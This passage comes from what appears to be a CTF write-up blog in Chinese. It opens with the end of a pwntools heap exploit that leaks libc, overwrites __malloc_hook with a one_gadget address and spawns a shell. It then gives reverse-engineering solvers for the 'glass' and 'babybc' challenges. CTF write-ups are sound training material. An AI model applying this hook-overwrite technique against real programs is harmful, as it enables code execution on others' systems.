number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span><span class="token number">0x48</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x48</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x78</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x78</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x78</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Content: '</span><span class="token punctuation">)</span>addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">0x70</span>malloc_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>one <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x4f3d5</span><span class="token punctuation">,</span><span class="token number">0x4f432</span><span class="token punctuation">,</span><span class="token number">0x10a41c</span><span class="token punctuation">]</span>one_gadget <span class="token operator">=</span> libc_base <span class="token operator">+</span> one<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'malloc_hook'</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>malloc_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span>  free<span class="token punctuation">(</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>malloc_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x78</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="glass"><a href="#glass" class="headerlink" title="glass"></a>glass</h3><pre class="language-python" data-language="python"><code class="language-python">key <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0xa3</span><span class="token punctuation">,</span><span class="token number">0x1a</span><span class="token punctuation">,</span><span class="token number">0xe3</span><span class="token punctuation">,</span><span class="token number">0x69</span><span class="token punctuation">,</span><span class="token number">0x2f</span><span class="token punctuation">,</span><span class="token number">0xbb</span><span class="token punctuation">,</span><span class="token number">0x1a</span><span class="token punctuation">,</span><span class="token number">0x84</span><span class="token punctuation">,</span><span class="token number">0x65</span><span class="token punctuation">,</span><span class="token number">0xc2</span><span class="token punctuation">,</span><span class="token number">0xad</span><span class="token punctuation">,</span><span class="token number">0xad</span><span class="token punctuation">,</span><span class="token number">0x9e</span><span class="token punctuation">,</span><span class="token number">0x96</span><span class="token punctuation">,</span><span class="token number">0x5</span><span class="token punctuation">,</span><span class="token number">0x2</span><span class="token punctuation">,</span><span class="token number">0x1f</span><span class="token punctuation">,</span><span class="token number">0x8e</span><span class="token punctuation">,</span><span class="token number">0x36</span><span class="token punctuation">,</span><span class="token number">0x4f</span><span class="token punctuation">,</span><span class="token number">0xe1</span><span class="token punctuation">,</span><span class="token number">0xeb</span><span class="token punctuation">,</span><span class="token number">0xaf</span><span class="token punctuation">,</span><span class="token number">0xf0</span><span class="token punctuation">,</span><span class="token number">0xea</span><span class="token punctuation">,</span><span class="token number">0xc4</span><span class="token punctuation">,</span><span class="token number">0xa8</span><span class="token punctuation">,</span><span class="token number">0x2d</span><span class="token punctuation">,</span><span class="token number">0x42</span><span class="token punctuation">,</span><span class="token number">0xc7</span><span class="token punctuation">,</span><span class="token number">0x6e</span><span class="token punctuation">,</span><span class="token number">0x3f</span><span class="token punctuation">,</span><span class="token number">0xb0</span><span class="token punctuation">,</span><span class="token number">0xd3</span><span class="token punctuation">,</span><span class="token number">0xcc</span><span class="token punctuation">,</span><span class="token number">0x78</span><span class="token punctuation">,</span><span class="token number">0xf9</span><span class="token punctuation">,</span><span class="token number">0x98</span><span class="token punctuation">,</span><span class="token number">0x3f</span><span class="token punctuation">]</span>num <span class="token operator">=</span> <span class="token string">'12345678'</span>number <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    number<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>a <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    b <span class="token operator">=</span> number<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    a <span class="token operator">=</span> <span class="token punctuation">(</span>a <span class="token operator">+</span> b <span class="token operator">+</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>num<span class="token punctuation">[</span>i<span class="token operator">%</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>    number<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> number<span class="token punctuation">[</span>a<span class="token punctuation">]</span>    number<span class="token punctuation">[</span>a<span class="token punctuation">]</span> <span class="token operator">=</span> b<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    key<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> key<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>num<span class="token punctuation">[</span>i<span class="token operator">%</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    key<span class="token punctuation">[</span><span class="token number">3</span><span class="token operator">*</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> key<span class="token punctuation">[</span><span class="token number">3</span><span class="token operator">*</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">^</span> key<span class="token punctuation">[</span><span class="token number">3</span><span class="token operator">*</span>i<span class="token punctuation">]</span>    key<span class="token punctuation">[</span><span class="token number">3</span><span class="token operator">*</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> key<span class="token punctuation">[</span><span class="token number">3</span><span class="token operator">*</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">^</span> key<span class="token punctuation">[</span><span class="token number">3</span><span class="token operator">*</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span>    key<span class="token punctuation">[</span><span class="token number">3</span><span class="token operator">*</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> key<span class="token punctuation">[</span><span class="token number">3</span><span class="token operator">*</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">^</span> key<span class="token punctuation">[</span><span class="token number">3</span><span class="token operator">*</span>i<span class="token punctuation">]</span> a <span class="token operator">=</span> <span class="token number">0</span>c <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">39</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    a <span class="token operator">=</span> <span class="token punctuation">(</span>a<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>    b <span class="token operator">=</span> number<span class="token punctuation">[</span>a<span class="token punctuation">]</span>    c <span class="token operator">=</span> <span class="token punctuation">(</span>c <span class="token operator">+</span> b<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>    number<span class="token punctuation">[</span>a<span class="token punctuation">]</span> <span class="token operator">=</span> number<span class="token punctuation">[</span>c<span class="token punctuation">]</span>    number<span class="token punctuation">[</span>c<span class="token punctuation">]</span> <span class="token operator">=</span> b    key<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span><span class="token operator">=</span> number<span class="token punctuation">[</span><span class="token punctuation">(</span>b <span class="token operator">+</span> number<span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span></code></pre><h3 id="babybc"><a href="#babybc" class="headerlink" title="babybc"></a>babybc</h3><p>用到 LLVM，再IDA打开</p><p>两个函数，写了各种限制</p><pre class="language-none"><code class="language-none">横row 0001 1000 2001 0000 1010map[0][3] &gt; map[0][4]map[1][0] &gt; map[1][1]map[2][0] &lt; map[2][1]map[2][3] &gt; map[2][4]map[4][0] &gt; map[4][1]map[4][2] &gt; map[4][3]纵col 00202 00000 00010 01001map[0][2] &gt; map[1][2]map[0][4] &gt; map[1][4]map[2][3] &lt; map[3][3]map[3][1] &lt; map[4][1]map[3][4] &lt; map[4][3]</code></pre><p>exp：</p><pre class="language-python" data-language="python"><code class="language-python">num1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>num2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>num3 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>num4 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>num5 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token comment">#################################</span><span class="token keyword">for</span> i1 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i2 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>i2 <span class="token operator">==</span> i1<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> i3 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>i3 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i3 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i3 <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">continue</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    <span class="token keyword">for</span> i4 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                        <span class="token keyword">if</span><span class="token punctuation">(</span>i4 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i4 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i4 <span class="token operator">==</span> i3  <span class="token keyword">or</span> i4 <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                            <span class="token keyword">continue</span>                        <span class="token keyword">else</span><span class="token punctuation">:</span>                            <span class="token keyword">for</span> i5 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                <span class="token keyword">if</span><span class="token punctuation">(</span>i5 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i5 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i5 <span class="token operator">==</span> i3 <span class="token keyword">or</span> i5 <span class="token operator">==</span>i4 <span class="token keyword">or</span> i4 <span class="token operator">&lt;=</span> i5<span class="token punctuation">)</span><span class="token punctuation">:</span>                                    <span class="token keyword">continue</span>                                <span class="token keyword">else</span><span class="token punctuation">:</span>                                    index <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i1<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i2<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i3<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i4<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i5<span class="token punctuation">)</span>                                    num1<span class="token punctuation">.</span>append<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token comment">#################################</span><span class="token keyword">for</span> i1 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i2 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>i2 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i2 <span class="token operator">>=</span> i1 <span class="token keyword">or</span> i2 <span class="token operator">==</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> i3 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>i3 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i3 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i3 <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">continue</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    <span class="token keyword">for</span> i4 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span>i4 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i4 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i4 <span class="token operator">==</span> i3 <span class="token keyword">or</span> i4 <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                            <span class="token keyword">continue</span>                        <span class="token keyword">else</span><span class="token punctuation">:</span>                            <span class="token keyword">for</span> i5 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                <span class="token keyword">if</span> <span class="token punctuation">(</span>i5 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i5 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i5 <span class="token operator">==</span> i3 <span class="token keyword">or</span> i5 <span class="token operator">==</span>i4<span class="token punctuation">)</span><span class="token punctuation">:</span>                                    <span class="token keyword">continue</span>                                <span class="token keyword">else</span><span class="token punctuation">:</span>                                    index <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i1<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i2<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i3<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i4<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i5<span class="token punctuation">)</span>                                    num2<span class="token punctuation">.</span>append<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token comment">#################################</span><span class="token keyword">for</span> i1 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i2 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>i2 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i1 <span class="token operator">>=</span> i2<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> i3 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>i3 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i3 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i3 <span class="token operator">!=</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">continue</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    <span class="token keyword">for</span> i4 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span>i4 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i4 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i4 <span class="token operator">==</span> i3 <span class="token keyword">or</span> i4 <span class="token operator">>=</span> <span class="token number">3</span> <span class="token keyword">or</span> i4 <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                            <span class="token keyword">continue</span>                        <span class="token keyword">else</span><span class="token punctuation">:</span>                            <span class="token keyword">for</span> i5 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                <span class="token keyword">if</span> <span class="token punctuation">(</span>i5 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i5 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i5 <span class="token operator">==</span> i3 <span class="token keyword">or</span> i5 <span class="token operator">==</span>i4 <span class="token keyword">or</span> i5 <span class="token operator">>=</span> i4<span class="token punctuation">)</span><span class="token punctuation">:</span>                                    <span class="token keyword">continue</span>                                <span class="token keyword">else</span><span class="token punctuation">:</span>                                    index <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i1<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i2<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i3<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i4<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i5<span class="token punctuation">)</span>                                    num3<span class="token punctuation">.</span>append<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token comment">#################################</span><span class="token keyword">for</span> i1 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i2 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>i2 <span class="token operator">==</span> i1<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> i3 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>i3 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i3 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i3 <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">continue</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    <span class="token keyword">for</span> i4 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span>i4 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i4 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i4 <span class="token operator">==</span> i3 <span class="token keyword">or</span> i4 <span class="token operator">!=</span> <span class="token number">3</span> <span class="token keyword">or</span> i4 <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                            <span class="token keyword">continue</span>                        <span class="token keyword">else</span><span class="token punctuation">:</span>                            <span class="token keyword">for</span> i5 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                <span class="token keyword">if</span> <span class="token punctuation">(</span>i5 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i5 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i5 <span class="token operator">==</span> i3 <span class="token keyword">or</span> i5 <span class="token operator">==</span>i4<span class="token punctuation">)</span><span class="token punctuation">:</span>                                    <span class="token keyword">continue</span>                                <span class="token keyword">else</span><span class="token punctuation">:</span>                                    index <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i1<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i2<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i3<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i4<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i5<span class="token punctuation">)</span>                                    num4<span class="token punctuation">.</span>append<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token comment">#################################</span><span class="token keyword">for</span> i1 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i2 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>i2 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i2 <span class="token operator">>=</span> i1<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> i3 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>i3 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i3 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i3 <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">continue</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    <span class="token keyword">for</span> i4 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span>i4 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i4 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i4 <span class="token operator">==</span> i3 <span class="token keyword">or</span> i3 <span class="token operator">&lt;=</span> i4 <span class="token keyword">or</span> i4 <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                            <span class="token keyword">continue</span>                        <span class="token keyword">else</span><span class="token punctuation">:</span>                            <span class="token keyword">for</span> i5 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                <span class="token keyword">if</span> <span class="token punctuation">(</span>i5 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i5 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i5 <span class="token operator">==</span> i3 <span class="token keyword">or</span> i5 <span class="token operator">==</span>i4 <span class="token keyword">or</span> i5 <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                    <span class="token keyword">continue</span>                                <span class="token keyword">else</span><span class="token punctuation">:</span>                                    index <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i1<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i2<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i3<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i4<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i5<span class="token punctuation">)</span>                                    num5<span class="token punctuation">.</span>append<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token comment">#################################</span><span class="token keyword">for</span> i1 <span class="token keyword">in</span> num1<span class="token punctuation">:</span>    <span class="token keyword">for</span> i2 <span class="token keyword">in</span> num2<span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>i1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> i2<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token keyword">or</span> i1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> i2<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            flag <span class="token operator">=</span> <span class="token number">0</span>            <span class="token keyword">for</span> i <span class="token 